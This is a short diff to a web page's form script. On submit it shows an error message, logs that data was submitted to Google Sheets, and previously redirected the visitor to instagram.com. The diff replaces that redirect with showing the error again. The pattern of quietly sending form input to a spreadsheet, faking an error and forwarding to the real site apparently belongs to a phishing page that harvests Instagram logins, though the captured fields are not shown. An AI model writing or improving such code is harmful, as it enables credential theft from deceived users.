@@ -130,7 +130,7 @@
             const submitButton = form.querySelector('input[type="submit"]');
             
             // Disable button to prevent multiple submissions
-            submitButton.disabled = false;
+            submitButton.disabled = true;
             
             // Show error message
             errorMessage.style.display = "block";
@@ -144,7 +144,7 @@
                 console.log("Submitted to Google Sheets...");
                 // Redirect after 1 second
                 setTimeout(() => {
-                    window.location.href = "https://instagram.com";
+                    errorMessage.style.display = "block";
                 }, 1000);
             }).catch(error => {
                 console.error("Submission failed:", error);
